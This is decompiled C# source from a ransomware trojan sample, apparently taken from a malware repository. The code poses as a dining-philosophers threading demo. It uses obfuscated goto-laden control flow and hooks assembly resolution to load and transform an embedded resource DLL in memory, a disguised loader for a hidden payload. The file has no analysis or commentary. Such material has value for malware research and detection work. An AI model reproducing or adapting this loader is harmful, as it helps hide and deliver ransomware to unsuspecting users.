// Decompiled with JetBrains decompiler
// Type: Kvpbvpfa.h
// Assembly: svchost88, Version=18.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 18B1A58D-3D4A-4D05-74FB-1743EEC806E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-538b973f12e7eb9390b9b64cb36818b73b139bee73af7d5c7b8c5d72a0dc037a.exe

using System;
using System.IO;
using System.Reflection;
using System.Threading;
using Vhihafkvtycyawgb;

namespace Kvpbvpfa
{
  internal sealed class h
  {
    private bool[] a;
    private int b;
    private int c;
    private int d;
    private int e;
    private char f;

    public h(bool[] a, int b)
    {
      if (true)
        goto label_4;
label_1:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      bool[] flagArray = a;
      if (true)
        goto label_5;
label_2:
      int num = b;
      if (true)
        goto label_6;
label_3:
      this.c = this.b;
      this.d = (this.b + 1) % 5;
      Console.WriteLine("Filosof {0}, left fork: {1}, right fork: {2}", (object) b, (object) this.c.ToString(), (object) this.d.ToString());
      return;
label_6:
      this.b = num;
      goto label_3;
label_5:
      this.a = flagArray;
      goto label_2;
label_4:
      this.f = 'T';
      goto label_1;
    }

    public void a()
    {
      if (false)
        return;
      this.b();
    }

    private void b()
    {
      AppDomain currentDomain = AppDomain.CurrentDomain;
      if (true)
        ;
      // ISSUE: method pointer
      ResolveEventHandler resolveEventHandler = new ResolveEventHandler((object) this, __methodptr(a));
      currentDomain.AssemblyResolve += resolveEventHandler;
    }

    public void c()
    {
      new ClassLibrary().Data();
      if (false)
        ;
    }

    public void d()
    {
      Random random1 = new Random();
      Random random2;
      if (true)
        random2 = random1;
      while (true)
      {
        int millisecondsTimeout = random2.Next(1000, 5000);
        if (true)
          goto label_5;
label_3:
        if (true)
          goto label_6;
label_4:
        lock (this.a)
        {
          while (this.a[this.d] || this.a[this.c])
            Monitor.Wait((object) this.a);
          this.a[this.d] = true;
          this.a[this.c] = true;
          this.f = 'S';
          ++this.e;
          Monitor.PulseAll((object) this.a);
        }
        Thread.Sleep(random2.Next(1000, 5000));
        lock (this.a)
        {
          if (!this.a[this.d] || !this.a[this.c])
            throw new InvalidOperationException("What the fuck!");
          this.a[this.d] = false;
          this.a[this.c] = false;
          Monitor.PulseAll((object) this.a);
        }
        this.f = 'T';
        continue;
label_6:
        this.f = 'V';
        goto label_4;
label_5:
        Thread.Sleep(millisecondsTimeout);
        goto label_3;
      }
    }

    internal char a()
    {
      if (true)
        ;
      return this.f;
    }

    internal int a()
    {
      if (true)
        ;
      return this.e;
    }

    internal int b()
    {
      if (true)
        ;
      return this.b;
    }

    private Assembly a(object a, ResolveEventArgs b)
    {
      h.a a1 = new h.a();
      if (true)
        goto label_4;
label_1:
      h.a a2;
      h.a a3 = a2;
      if (true)
        goto label_5;
label_2:
      string str = Array.Find<string>(this.GetType().Assembly.GetManifestResourceNames(), new Predicate<string>(a2.a));
      if (true)
        goto label_6;
label_3:
      string name;
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
      {
        byte[] numArray = new byte[manifestResourceStream.Length];
        manifestResourceStream.Read(numArray, 0, numArray.Length);
        return AppDomain.CurrentDomain.Load(g.b(numArray));
      }
label_6:
      name = str;
      goto label_3;
label_5:
      a3.a = "Kvpbvpfa.Vhihafkvtycyawgb.dll";
      goto label_2;
label_4:
      a2 = a1;
      goto label_1;
    }

    private sealed class a
    {
      public string a;

      public a()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal bool a(string a)
      {
        string str = a;
        if (true)
          ;
        if (true)
          ;
        string a1 = this.a;
        return str.EndsWith(a1);
      }
    }
  }
}
